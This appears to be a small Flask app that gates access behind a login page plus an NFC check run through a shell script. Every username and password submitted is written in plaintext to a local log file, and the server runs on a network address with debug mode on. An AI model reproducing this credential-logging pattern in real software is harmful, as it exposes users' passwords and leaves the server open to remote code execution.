from flask import Flask
from flask import request
from flask import render_template
import os
import time
from os.path import exists
from test import login

app = Flask(__name__)



@app.route('/', methods=['GET', 'POST'])
def my_form():

    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        nfc = nfc_test()
        check = login(username,password)

        with open("LoginAttempts.txt", "a") as file:
            file.write(time.ctime()+'\n')
            file.write('Username: '+username+'\n')
            file.write('Password: '+password+'\n')
            file.write('NFC Present: '+nfc+'\n')
            file.write('Correct Login: '+check+'\n')
            file.write('-------------------------------------\n')



        if username == '' or password == '':
            return render_template("login.html") #If user doesnt input antything, refresh page
        elif nfc == 'False':
            return render_template("login.html") #If user doesnt input antything, refresh page
        elif check == "False":
            return render_template("login.html") #If user doesnt input antything, refresh page
        else:
            return render_template('redirect.html', new=0, autoraise=True) # Sends user to html file that redirects to website



    return render_template("login.html") # When user enters URL load login.html (fake login page)

def nfc_test():
    os.system('./login.sh')
    file_exists = exists('True')
    if file_exists:
        os.system('rm True')
        return 'True'
    else:
        os.system('rm False')
        return 'False'


if __name__ == '__main__':
    app.run(host="192.168.1.42", port=5000, debug=True)
